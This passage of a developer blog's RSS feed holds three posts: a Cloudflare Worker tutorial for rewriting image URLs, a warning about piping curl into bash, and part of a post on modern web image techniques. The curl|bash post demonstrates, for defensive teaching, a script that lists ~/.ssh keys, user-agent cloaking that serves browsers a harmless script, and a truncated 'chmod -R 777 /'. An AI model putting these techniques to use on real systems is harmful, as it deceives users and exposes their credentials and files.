edit&quot; button and you&apos;ll have a pretty decent editing &amp;amp; debugging environment without needing to set up anything locally.&lt;/p&gt;&lt;p&gt;Let&apos;s use &lt;code&gt;fetch()&lt;/code&gt; to intercept and immediately return the response.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
	async fetch(request, _env, ctx) {
    return fetch(request);
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After deploying that and navigating to the URL, you should see that &lt;em&gt;nothing&lt;/em&gt; has changed. The exact same response is being returned. It&apos;s just a catch &amp;amp; release.&lt;/p&gt;&lt;h3&gt;Rewriting HTML&lt;/h3&gt;&lt;p&gt;We&apos;re now ready to rewrite our image URLs, and thanks to a primitive provided by Cloudflare, it&apos;s extremely easy to do. We&apos;ll use the &lt;a href=&quot;https://developers.cloudflare.com/workers/runtime-apis/html-rewriter/?ref=cms.macarthur.me&quot;&gt;HTMLRewriter&lt;/a&gt; class, allowing us to grab elements with familiar CSS selectors and manipulate them as desired.&lt;/p&gt;&lt;p&gt;Let&apos;s update worker to return the transformed result of that rewriter using the handler we&apos;ll create in a second:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
	async fetch(request, _env, ctx) {
		const response = await fetch(request);

        // Using `let` for a reason. Stay tuned.
		let transformedResponse = new HTMLRewriter()
			.on(&quot;*&quot;, new ElementHandler())
			.transform(response);
        
        return transformedResponse;
  },
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And here&apos;s that handler. We&apos;re only interested in elements, so it&apos;ll be pretty slim:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const prefix = &quot;https://picperf.io&quot;;

class ElementHandler {
  element(element) {
    for (const [name, value] of element.attributes) {
      if (name === &quot;src&quot;) {
        element.setAttribute(&quot;src&quot;, `${prefix}/${value}`);
      }
    }
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The element&apos;s attributes are exposed as an iterator that can&apos;t be individually accessed by key, so we&apos;ll use  a &lt;code&gt;for&lt;/code&gt; loop to check for the &lt;code&gt;src&lt;/code&gt; attribute, after which we slap in our prefix. &lt;/p&gt;&lt;p&gt;Save that, and we&apos;ll now see our single image prefixed correctly:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/02/image-6.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1310&quot; height=&quot;202&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/02/image-6.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/02/image-6.png 1000w, https://cms.macarthur.me/content/images/2024/02/image-6.png 1310w&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;Handling Inline CSS&lt;/h3&gt;&lt;p&gt;It&apos;s common for background images to be set by a CMS as inline style attributes, so let&apos;s upgrade our worker to transform them too. Let&apos;s add the following function to our worker. It&apos;ll replace every &lt;code&gt;url()&lt;/code&gt; in a string of CSS with the prefixed version. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function prefixCssUrls(cssString) {
	return cssString.replace(/url\((.*?)\)/g, (match, url) =&amp;gt; {
		if (!url.startsWith(prefix)) {
			return `url(${prefix}/${url.trim()})`;
		}

		return match;
	});
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then we can add another section to our &lt;code&gt;ElementHandler&lt;/code&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;class ElementHandler {
	element(element) {
		for (const [name, value] of element.attributes) {
			if (name === &quot;src&quot;) {
				element.setAttribute(&quot;src&quot;, `${prefix}/${value}`);
			}
      
+			if (name === &quot;style&quot;) {
+				element.setAttribute(&quot;style&quot;, prefixCssUrls(value));
+			}
		}
	}
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The HTML&apos;s now looking even better: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/02/image-5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1270&quot; height=&quot;272&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/02/image-5.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/02/image-5.png 1000w, https://cms.macarthur.me/content/images/2024/02/image-5.png 1270w&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;Don&apos;t Forget About Style Tags&lt;/h3&gt;&lt;p&gt;Some of those background images may be defined via &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; tags, so let&apos;s make sure we account for those too. We&apos;re no longer strictly dealing with attributes now (we want to transform the &lt;em&gt;content&lt;/em&gt; of a tag), so we&apos;ll need to create a distinct handler.&lt;/p&gt;&lt;p&gt;In the root of our worker, let&apos;s instantiate another &lt;code&gt;HTMLRewriter&lt;/code&gt;, this time using a &lt;code&gt;style&lt;/code&gt; selector: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
	async fetch(request, _env, ctx) {
        
        // ...our ElementHandler here...

		const transformedResponse = new HTMLRewriter()
			.on(&quot;style&quot;, new StyleHandler())
			.transform(transformedResponse);

		return transformedResponse;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And that &lt;code&gt;StyleHandler&lt;/code&gt; will also be slim, reusing the &lt;code&gt;prefixCssUrls()&lt;/code&gt; function we made earlier: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;class StyleHandler {
	text(chunk) {
		chunk.replace(prefixCssUrls(chunk.text));
	}
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After deploying that change, the background URLs embedded within &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; tags are now correctly prefixed: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/02/image-7.png&quot; alt=&quot;prefixed CSS background URL in a style tag&quot; loading=&quot;lazy&quot; width=&quot;1522&quot; height=&quot;336&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/02/image-7.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/02/image-7.png 1000w, https://cms.macarthur.me/content/images/2024/02/image-7.png 1522w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That should cover the bulk of the images embedded directly in our HTML. But there&apos;s something we can do to optimize performance a little more. &lt;/p&gt;&lt;h2&gt;Caching a Page&apos;s Transformations&lt;/h2&gt;&lt;p&gt;Everything happening here executes quickly at the edge, but Cloudflare offers a nice &lt;a href=&quot;https://developers.cloudflare.com/workers/runtime-apis/cache/?ref=cms.macarthur.me&quot;&gt;caching API&lt;/a&gt; to optimize even further. We&apos;ll use it to perform transformations only if we don&apos;t have a cached version of that same request already available. There&apos;s no need to import or anything else – it&apos;s available on the &lt;code&gt;caches&lt;/code&gt; global variable. We&apos;ll be using the &lt;code&gt;default&lt;/code&gt; cache, but you&apos;re welcome to &lt;a href=&quot;https://developers.cloudflare.com/workers/runtime-apis/cache/?ref=cms.macarthur.me#accessing-cache&quot;&gt;create your own&lt;/a&gt; as well.&lt;br /&gt;&lt;br /&gt;Zooming in on the root worker handler again:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
	async fetch(request, _env, ctx) {
        
	// Transform HTML &amp;amp; save to `transformedResponse` variable...

		ctx.waitUntil(caches.default.put(request, transformedResponse.clone()));

		return transformedResponse;
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A few notes on that: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;That &lt;code&gt;ctx.waitUntil()&lt;/code&gt; is important, letting us &lt;a href=&quot;https://developers.cloudflare.com/workers/runtime-apis/handlers/fetch/?ref=cms.macarthur.me#contextwaituntil&quot;&gt;asynchronously do work&lt;/a&gt; without blocking the worker&apos;s response. &lt;/li&gt;&lt;li&gt;The key our cached response is the request itself. You &lt;a href=&quot;https://developers.cloudflare.com/workers/runtime-apis/cache/?ref=cms.macarthur.me#parameters&quot;&gt;could also use the URL&lt;/a&gt;, but this is a little cleaner.&lt;/li&gt;&lt;li&gt;It&apos;s important to &lt;code&gt;.clone()&lt;/code&gt; our response because &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Response/clone?ref=cms.macarthur.me&quot;&gt;it can only be read once&lt;/a&gt;. If you don&apos;t, you&apos;ll get a &lt;code&gt;TypeError&lt;/code&gt; that says something like this: &quot;Body has already been used. It can only be used once.&quot;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Of course, after that&apos;s in place, you can start returning the cached version of the request when it exists: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
	async fetch(request, _env, ctx) {
+		const cachedResponse = await caches.default.match(request);
+
+		if (cachedResponse) {
+			return cachedResponse;
+		}
        
		// Transform HTML &amp;amp; save to `transformedResponse` variable...

		ctx.waitUntil(caches.default.put(request, transformedResponse.clone()));

		return transformedResponse;
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The worker cache API will respect the &lt;code&gt;Cache-Control&lt;/code&gt; headers of &lt;a href=&quot;https://developers.cloudflare.com/workers/runtime-apis/cache/?ref=cms.macarthur.me#headers&quot;&gt;the response&lt;/a&gt; you&apos;re caching. If you&apos;d like to tweak how it behaves, you&apos;d need to create a new response with the particular header&apos;s you&apos;d like it to use. &lt;/p&gt;&lt;h2&gt;Just to Cover Your Butt...&lt;/h2&gt;&lt;p&gt;We&apos;re in a good place, but there are a couple things I&apos;d recommend doing before calling it done. &lt;/p&gt;&lt;p&gt;First, if you&apos;re concerned that something terrible could happen in the transformation process, stick &lt;code&gt;ctx.passThroughOnException()&lt;/code&gt; at the beginning of your worker&apos;s handler. When any exception is thrown, it&apos;ll fall back to getting a response directly from your origin server.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
	async fetch(request, _env, ctx) {
		ctx.passThroughOnException();

		// Other stuff...
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And second, limit all this work to the &lt;code&gt;GET&lt;/code&gt; HTTP method. The only place this work is useful is when a user views HTML in the browser, and that&apos;s a &lt;code&gt;GET&lt;/code&gt;. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
	async fetch(request, _env, ctx) {
		ctx.passThroughOnException();

+		if (request.method !== &apos;GET&apos;) throw new Error(&quot;Not a GET!&quot;);

		// Other stuff...
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thanks to the &lt;code&gt;ctx.passThroughOnException()&lt;/code&gt; line we just added, throwing that error will pass other HTTP method requests through to origin without trying to process them.&lt;/p&gt;&lt;h2&gt;Tweak as Needed&lt;/h2&gt;&lt;p&gt;The full implementation is nice &amp;amp; short – less than 60 lines. If you&apos;d like to see it, &lt;a href=&quot;https://github.com/alexmacarthur/image-transformation-demo?ref=cms.macarthur.me&quot;&gt;&lt;a href=&quot;https://github.com/alexmacarthur/image-transformation-demo?ref=cms.macarthur.me&quot;&gt;I wrapped&lt;/a&gt; it up&lt;/a&gt;. Feel free to pull it down and adjust as needed.&lt;/p&gt;&lt;p&gt;Once it&apos;s deployed in your account, you&apos;re set for a while. Cloudflare provides a &lt;a href=&quot;https://developers.cloudflare.com/workers/platform/pricing/?ref=cms.macarthur.me&quot;&gt;generous free tier&lt;/a&gt; for its workers. If you do stick with PicPerf, however, just make sure you register your domains after &lt;a href=&quot;https://app.picperf.io/sign-up?ref=cms.macarthur.me&quot;&gt;creating an account&lt;/a&gt;. If you don&apos;t, you won&apos;t be able to reap the performance benefits.&lt;/p&gt;&lt;p&gt;Hope some of this was helpful!&lt;/p&gt;</content:encoded></item><item><title>Hold a Healthy Sense of Caution Whenever Running a curl|bash Command</title><link>https://macarthur.me/posts/curl-to-bash</link><guid isPermaLink="true">https://macarthur.me/posts/curl-to-bash</guid><pubDate>Sun, 18 Feb 2024 18:47:32 GMT</pubDate><content:encoded>&lt;p&gt;If you&apos;ve installed nerd software on your machine before, you&apos;ve almost certainly executed a command like this before:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;curl -sL https://some-domain.com/install.sh | bash &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you&apos;re anything like me, it took a long time (maybe years) to even ask what that sort of command is even doing. It&apos;s not much: &lt;code&gt;curl&lt;/code&gt; retrieves a response and immediately feeds it to &lt;code&gt;bash&lt;/code&gt; to execute on your machine. It&apos;s simple, flexible, and powerful. &lt;/p&gt;&lt;p&gt;With perks like that, it&apos;s no surprise &lt;a href=&quot;https://brew.sh/?ref=cms.macarthur.me&quot;&gt;Homebrew&lt;/a&gt;, &lt;a href=&quot;https://bun.sh/?ref=cms.macarthur.me&quot;&gt;Bun&lt;/a&gt;, &lt;a href=&quot;https://github.com/nvm-sh/nvm?tab=readme-ov-file&amp;amp;ref=cms.macarthur.me#install--update-script&quot;&gt;nvm&lt;/a&gt;, and a bajillion other tools over the years have used a &quot;curl to bash&quot; for distributing their tools to machines. I&apos;m actually one of them. I opted to use the tactic for the &lt;a href=&quot;https://plausiblebootstrapper.com/?ref=cms.macarthur.me&quot;&gt;Plausible Bootstrapper&lt;/a&gt;&apos;s installation experience, and I&apos;m glad I did.&lt;/p&gt;&lt;p&gt;But the experience of building that out made me think a little more deeply about the practice. It&apos;s useful, but it also comes with risk that&apos;s easy to overlook. Bad guys love words like &quot;simple,&quot; and &quot;powerful.&quot; It means there&apos;s an opportunity to exploit. All it takes to become vulnerable is failing to pay attention to what you&apos;re running on your machine.&lt;/p&gt;&lt;p&gt;I&apos;m certainly not saying we should do away with the practice altogether. I just want to reignite a healthy sense of caution when ever it&apos;s used, starting within myself. And that means getting in touch with some of its biggest risks. &lt;/p&gt;&lt;h2&gt;The Biggest Concerns with Piping Curl Responses to Bash&lt;/h2&gt;&lt;p&gt;There are some loud voices out there outrightly opposed to &lt;code&gt;curl|bash&lt;/code&gt;, and the risks that power their apprehension is real. Here are some of the big ones:&lt;/p&gt;&lt;h3&gt;You could execute malicious code on your machine. &lt;/h3&gt;&lt;p&gt;It&apos;s the obvious one. By nature of this type of command, whatever the endpoint returns will be executed &lt;em&gt;directly&lt;/em&gt; on your machine with no hesitation. If you&apos;re copying &amp;amp; executing that command in one fell swoop, you don&apos;t get to review what&apos;s about to happen. There&apos;s no further approval process. No integrity verification step. It just &lt;em&gt;goes&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;From a bad guy&apos;s perspective, wouldn&apos;t take much to do something evil. Here&apos;s one I made with a small serverless function. All it does is return a stringified shell script: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default async (request, response) =&amp;gt; {
  return response.status(200).send(`
    #!/bin/bash

    echo &quot;Taxation is theft.&quot;
  `);
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s run by executing the following: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;curl -sL https://macarthur.me/run | bash&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Of course, a bad guy would do something more nefarious, like read all of your private &lt;code&gt;~/.ssh&lt;/code&gt; keys and do whatever it is bad guys do with them.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default async (request, response) =&amp;gt; {
	return response.status(200).send(`
		#!/bin/bash

		echo &quot;I could steal these:&quot;

		ls ~/.ssh
	`);
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You get the idea. There are very few guardrails with this tactic, increasing your odds of falling off a cliff.&lt;/p&gt;&lt;h3&gt;It can behave differently based on the user agent.&lt;/h3&gt;&lt;p&gt;You might think you could avoid the risk by popping the endpoint in your browser and previewing the source code before running it. That&apos;s a good practice, but it&apos;s not bulletproof. On the bad guy&apos;s end, it&apos;s easy enough to change the output when you know someone&apos;s accessing it through a browser instead of a terminal. With a quick sniff of the user agent, you could end up &lt;em&gt;seeing&lt;/em&gt; a very different script from what&apos;s actually run.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;+ function isProbablyABrowser(request) {
+	return !/curl|postman/i.test(request.headers[&quot;user-agent&quot;]);
+ }

export default async (request, response) =&amp;gt; {
+	if (isProbablyABrowser(request)) {
+    	return response.status(200).send(`
+      		#!/bin/bash
+
+      		echo &quot;I&apos;m very innocent!&quot;
+ 		`);
+  	}
+
	return response.status(200).send(`
		#!/bin/bash

		echo &quot;I could steal these:&quot;

		ls ~/.ssh
	`);
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Being that easy, skimming through the script in a browser might amount to nothing more than false confidence. Run it in a terminal and you&apos;re still screwed.&lt;/p&gt;&lt;h3&gt;You could accidentally execute a partially downloaded script.&lt;/h3&gt;&lt;p&gt;Under certain conditions, it&apos;s possible to retrieve and execute incomplete contents of an entire script. At best, your system would be left in an &quot;unfinished&quot; state or the script might bomb altogether, but at worst, it could wreak havoc on your machine. &lt;/p&gt;&lt;p&gt;Here&apos;s a contrived example. Let&apos;s say you&apos;ve run piped a script to bash to that was interrupted for some reason, but it still sent some contents to execute. In this case, I&apos;ll just throw an error in the middle of the process constructing the full script. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default async (request, response) =&amp;gt; {
	response.write(&quot;#!/bin/bash\n&quot;);

	const scriptParts = [
		&quot;chmod&quot;, 
		&quot;-R&quot;, 
		&quot;777&quot;, 
		&quot;/&quot;, 
		&quot;specific/directory&quot;
	];

	for (let index = 0; index &amp;lt; scriptParts.length; index++) {
		// Oh no!
		if (index === scriptParts.indexOf(&quot;specific/directory&quot;)) {
			console.error(&quot;Something unexpected happened!&quot;);
			break;
		}

		response.write(scriptParts[index] + &quot; &quot;);
	}

	response.end();
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A script that &lt;em&gt;should&lt;/em&gt; have given permissions to a particular directory had a blip, causing this to be returned: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash
chmod -R 777 / &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And now, your entire system was made vulnerable by granting every user unintended access. &lt;/p&gt;&lt;p&gt;From an author&apos;s perspective, this is easily preventable: wrap the script body in a function, and only call that function after it&apos;s been fully downloaded: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash

function main {
  chmod -R 777 /specific/directory
}

main()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, the script can only execute after &lt;em&gt;all&lt;/em&gt; of it&apos;s been downloaded. Much less risky.&lt;/p&gt;&lt;h2&gt;Just Pay Attention&lt;/h2&gt;&lt;p&gt;This certainly isn&apos;t the only set of risks associated with piping &lt;code&gt;curl&lt;/code&gt; to &lt;code&gt;bash&lt;/code&gt;, but they hopefully set the tone for how serious the consequences could be if you&apos;re not paying attention. &lt;/p&gt;&lt;p&gt;That probably is the most effective thing you can do to balance the immense value of these commands with the risks they carry: &lt;em&gt;pay attention&lt;/em&gt;. Tangibly, that means: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Know what you expect to happen &lt;em&gt;before&lt;/em&gt; running the command.&lt;/strong&gt; Consider the side effects. Get a grip on the intended outcome of the script. Sometimes, makers aren&apos;t even trying to do anything nasty. You might&apos;ve just sucked at reading the documentation, and now other system-level dependencies no longer behave the way they previously did.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Make sure you trust the author. &lt;/strong&gt;Even if you don&apos;t know them personally, you can usually pick up on enough clues to derive that trust. Inspect their website. Find corroborating reviews. Run a quick search to see if anyone else has regretted using this thing.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Read (and understand) the command itself. &lt;/strong&gt;Don&apos;t fall prey to blindly copying &amp;amp; pasting an installation command you find in some documentation. For all you know, the endpoint might not be protected via TLS, and now you&apos;ve opened yourself up to a man-in-the-middle attack. It&apos;s on &lt;em&gt;you&lt;/em&gt; to know what you&apos;re about to run on your machine, and what it&apos;s designed to do. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Engineering life would&apos;ve been a lot harder if it weren&apos;t for the &lt;code&gt;curl|bash&lt;/code&gt; commands I&apos;ve run over the years, and I&apos;m grateful to the authors who&apos;ve made it so easy to get up &amp;amp; going by using the approach. But it&apos;s one of the many things out there that you shouldn&apos;t get &lt;em&gt;too&lt;/em&gt; comfortable using. So, be smart and have a healthy sense of caution whenever you do.&lt;/p&gt;</content:encoded></item><item><title>It&apos;s Never Been Easier to Performantly Put Images on the Web</title><link>https://macarthur.me/posts/images</link><guid isPermaLink="true">https://macarthur.me/posts/images</guid><pubDate>Fri, 09 Feb 2024 00:57:37 GMT</pubDate><content:encoded>&lt;p&gt;It probably wasn&apos;t in your local news, but something non-trivial in web development occurred early this year: Microsoft Edge &lt;a href=&quot;https://learn.microsoft.com/en-us/deployedge/microsoft-edge-relnote-stable-channel?ref=cms.macarthur.me#version-1210227783-january-25-2024&quot;&gt;added support for the AVIF image format&lt;/a&gt;. It was the last of the major browsers to do so, after taking a frustratingly long while, apparently due to &lt;a href=&quot;https://toot.cafe/@slightlyoff/109899372183448386?ref=cms.macarthur.me&quot;&gt;licensing issues&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;Nevertheless, I&apos;m so here for it. I&apos;ve been waiting a long time to pull the trigger on supporting AVIF in &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt;, so I&apos;m very happy to finally make that happen. &lt;/p&gt;&lt;p&gt;Excitement aside, the news also gave me some pause. The web&apos;s made some &lt;em&gt;big&lt;/em&gt; strides in enabling the effective, performant use of images over the past decade or so, and this is just the latest example of that trend. It&apos;s worth reminiscing. Here are some that stick out to me.&lt;/p&gt;&lt;h2&gt;Responsive Images&lt;/h2&gt;&lt;p&gt;For a long time, the HTML &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag had one job, and it didn&apos;t behave differently based on the device on which it was used. The &lt;code&gt;src&lt;/code&gt; attribute pointed to an image, and always that image. As the variety of screen dimensions exploded, that obviously became a problem. Image are expensive resources, new formats were beginning to be introduced, and the &quot;one size fits all&quot; &lt;code&gt;src&lt;/code&gt; attribute just wasn&apos;t cutting it. &lt;/p&gt;&lt;p&gt;So, in 2014, &lt;a href=&quot;https://thehistoryoftheweb.com/responsive-design-picture-element/?ref=cms.macarthur.me&quot;&gt;browsers began rolling&lt;/a&gt; out the &lt;code&gt;srcset&lt;/code&gt; attribute for &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; elements, and a new standalone element: &lt;code&gt;&amp;lt;picture&amp;gt;&lt;/code&gt;. Suddenly, you could begin loading completely different image resources depending on the size of the user&apos;s device, it&apos;s rendered dimensions, and the screen&apos;s pixel density:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;small.jpg&quot; 
     srcset=&quot;small.jpg 500w,
             medium.jpg 1000w,
             large.jpg 2000w&quot;
     sizes=&quot;(max-width: 600px) 500px,
            (max-width: 1000px) 1000px,
            2000px&quot;
     alt=&quot;Example Image&quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And using the &lt;code&gt;&amp;lt;picture&amp;gt;&lt;/code&gt; element, you could now much more easily load modern image formats &lt;a href=&quot;https://www.smashingmagazine.com/2014/05/responsive-images-done-right-guide-picture-srcset/?ref=cms.macarthur.me#the-type-switching-use-case&quot;&gt;for devices that supported them&lt;/a&gt;, and fall back to an &quot;older&quot; version for those that didn&apos;t:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;picture&amp;gt;
  &amp;lt;source srcset=&quot;image.avif&quot; type=&quot;image/avif&quot;&amp;gt;
  &amp;lt;img src=&quot;image.jpg&quot; alt=&quot;image description&quot;&amp;gt;
&amp;lt;/picture&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I also appreciate how progressive enhancement is a high concern of these tools. If used right, nobody&apos;s experience had to break just because they were on a company machine using a version of Internet Explorer from 1942.&lt;/p&gt;&lt;h2&gt;Native Lazy Loading&lt;/h2&gt;&lt;p&gt;Years ago, I wrote about &lt;a href=&quot;https://macarthur.me/posts/build-your-own-simple-lazy-loading-functionality-in-wordpress?ref=cms.macarthur.me&quot;&gt;rolling your own image lazy loading&lt;/a&gt; in WordPress using JavaScript (specifically the Intersection Observer API). As suggested by my blog traffic at the time, it served a need. People knew just how overbearing loading images unnecessarily could be, and it was common to use JavaScript to &quot;trick&quot; the browser into loading the resource only when it was needed by modifying the &lt;code&gt;src&lt;/code&gt; attribute (glance at the post if you&apos;re unfamiliar with the tactic). &lt;/p&gt;&lt;p&gt;Nevertheless, it was still a &lt;em&gt;trick&lt;/em&gt;, and when there was chatter of Chrome introducing native lazy loading &lt;a href=&quot;https://css-tricks.com/a-native-lazy-load-for-the-web-platform/?ref=cms.macarthur.me&quot;&gt;back in 2018&lt;/a&gt;, you could feel a collective sigh of relief amongst the front-end community. There&apos;d be much less &quot;thinking&quot; about it all. Add the attribute, and it just works. No JavaScript needed:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- The old way: reliance on JavaScript. --&amp;gt;
&amp;lt;img data-src=&quot;below-the-fold-image.jpg&quot; alt=&quot;my image&quot; /&amp;gt;
&amp;lt;script&amp;gt;jsThatTurnsDataSrcToSrcWhenImageIsInView();&amp;lt;/script&amp;gt;

&amp;lt;!-- The new way: just use the &quot;loading&quot; attribute! --&amp;gt;
&amp;lt;img loading=&quot;lazy&quot; src=&quot;below-the-fold-image.jpg&quot; alt=&quot;my image&quot; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Of course, there are still footguns with the tool too. For example, you can actually end up &lt;a href=&quot;https://make.wordpress.org/core/2023/04/05/wordpress-6-2-performance-improvements-for-all-themes/?ref=cms.macarthur.me&quot;&gt;harming performance by lazy loading everything&lt;/a&gt;. This insight even led to WordPress making a an image loading change a while back – moving from lazy loading everything to everything &lt;a href=&quot;https://make.wordpress.org/core/2023/04/05/wordpress-6-2-performance-improvements-for-all-themes/?ref=cms.macarthur.me&quot;&gt;except the first image&lt;/a&gt; in a block theme.&lt;/p&gt;&lt;h2&gt;Priority Hints&lt;/h2&gt;&lt;p&gt;The browser is a smart work of engineering, and it&apos;s really good about prioritizing the loading of different resources at the right time. Still, it can benefit from receiving explicit &quot;hints&quot; when it couldn&apos;t otherwise tell. This is why &lt;a href=&quot;https://macarthur.me/posts/priority-hints?ref=cms.macarthur.me&quot;&gt;priority hints can be helpful&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;You can clue the browser in on resource priority in a number of ways, such as preloading fonts in the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; of your document, setting the &lt;code&gt;priority&lt;/code&gt; of a &lt;code&gt;fetch()&lt;/code&gt; request, and with the &lt;code&gt;fetchpriority&lt;/code&gt; attribute, it&apos;s possible with images too:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;cat-1.jpeg&quot; fetchpriority=&quot;high&quot;/&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is probably most applicable for your &quot;hero&quot; inage appearing above the fold. If it&apos;s the bulk of the content a user will see when first visiting your page, give the browser no doubt: this image is &lt;em&gt;important&lt;/em&gt;. It&apos;s particularly useful in combination with native lazy loading. Most of your images might be safely fetched as needed, with the exception of the primary one at the top of the page:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;cat-1.jpg&quot; fetchpriority=&quot;high&quot; /&amp;gt;
&amp;lt;img src=&quot;cat-2.jpg&quot; loading=&quot;lazy&quot; /&amp;gt;
&amp;lt;img src=&quot;cat-3.jpg&quot; loading=&quot;lazy&quot;/&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Again, a nice thing about these tools is that they won&apos;t break the experience for anyone on an older device. Those attributes will just be ignored.&lt;/p&gt;&lt;h2&gt;Modern Formats&lt;/h2&gt;&lt;p&gt;It&apos;s worth camping out on this one a little more. For a &lt;em&gt;long&lt;/em&gt; time, formats like PNG and JPEG have dominated the web, and they&apos;ve served us well during that time. But formats like WebP and AVIF, in many (probably most) cases, serve as superior alternatives. &lt;/p&gt;&lt;p&gt;Narrowing in on WebP: this format came onto the scene in 2010 and is based on the VP8 video codec, using &quot;&lt;a href=&quot;https://developers.google.com/speed/webp?ref=cms.macarthur.me&quot;&gt;predictive coding&lt;/a&gt;&quot; to encode pixels. For both lossless and lossy formats, it&apos;s roughly 25-34% smaller in output compared to JPEGs, and it also supports features like transparency and animations. But it&apos;s not slways perfect. &lt;a href=&quot;https://siipo.la/blog/is-webp-really-better-than-jpeg?ref=cms.macarthur.me&quot;&gt;smaller sizes aren&apos;t guaranteed&lt;/a&gt;, and lossy compression can sometimes produce lower quality than you might expect.&lt;/p&gt;&lt;p&gt;AVIF, on the other hand, touts even more efficient compression levels – &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types?ref=cms.macarthur.me&quot;&gt;up to 50% smaller&lt;/a&gt; than JPEG counterparts. And it also supports features like HDR, arguably making it a better format for larger images where detail preservation really matters. &lt;/p&gt;&lt;p&gt;There are trade-offs, though. Producing an AVIF image takes a rather &lt;a href=&quot;https://github.com/lovell/sharp/issues/2597?ref=cms.macarthur.me&quot;&gt;large amount of computational power&lt;/a&gt; – an issue I found really challenging while bringing support to &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt;. And it also doesn&apos;t enjoy the same level of browser support as WebP (that&apos;s quickly changing, however).&lt;/p&gt;&lt;p&gt;All that said, I think there&apos;s plenty of room for multiple modern formats (we&apos;ll soon be talking about &lt;a href=&quot;https://jpeg.org/jpegxl/?ref=cms.macarthur.me&quot;&gt;JPEG XL&lt;/a&gt; a lot more too), and the variety can help serve compression needs that depend on device, image size, and a host of other factors. The web&apos;s gonna continue to benefit from that flexibility.&lt;/p&gt;&lt;h2&gt;Don&apos;t Get Carried Away&lt;/h2&gt;&lt;p&gt;The HTTP Archive shows that &lt;a 